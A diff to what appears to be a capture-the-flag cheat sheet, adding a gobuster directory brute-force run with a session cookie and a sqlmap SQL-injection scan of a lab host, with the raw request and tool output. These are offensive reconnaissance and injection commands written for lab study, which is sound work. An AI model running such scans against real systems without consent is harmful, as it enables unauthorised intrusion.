@@ -366,6 +366,72 @@
 * If usb keys are mapped with pcap, we can use this Article to extract usb keys entered: [Link](https://medium.com/@ali.bawazeeer/kaizen-ctf-2018-reverse-engineer-usb-keystrok-from-pcap-file-2412351679f4)
   * Example Command : `tskark.exe -r <FILE_NAME.pcapng> -Y "usb.transfer_types==1" -e "frame.time.epoch" -e "usb.capdata" -Tfields`
 
+### Gobuster with Cookie (Useful to directory traversal when cookie is needed )
+```root@kali:# gobuster dir -u http://<IP_ADDRESS> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -c PHPSESSID=<COOKIE_VALUE>
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://<IP_ADDRESS>
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] Cookies:        <COOKIE_VALUE>
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2020/04/19 01:43:01 Starting gobuster
+===============================================================
+/home.php (Status: 302)
+/index.php (Status: 200)
+```
+
+### SQL MAP Usage
+Redirect the HTTP Request to Burpsuite and we can see the request like this.
+```
+POST / HTTP/1.1
+Host: 10.10.10.162
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://10.10.10.162/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+search=help
+```
+Now Right click and click on `copy to file` option.
+```
+root@kali:/SqlMap# sqlmap -r search.req --batch --force-ssl
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.3#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 01:25:16 /2020-04-19/
+
+[01:25:16] [INFO] parsing HTTP request from 'search.req'
+[01:25:17] [INFO] testing connection to the target URL
+[01:25:17] [INFO] checking if the target is protected by some kind of WAF/IPS
+[01:25:17] [INFO] testing if the target URL content is stable
+[01:25:18] [INFO] target URL content is stable
+[01:25:18] [INFO] testing if POST parameter 'search' is dynamic
+[01:25:18] [WARNING] POST parameter 'search' does not appear to be dynamic
+[01:25:18] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
+[01:25:19] [INFO] testing for SQL injection on POST parameter 'search'
+[01:25:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[01:25:20] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[01:25:21] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[01:25:22] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+```
 
 ## Contribute
 
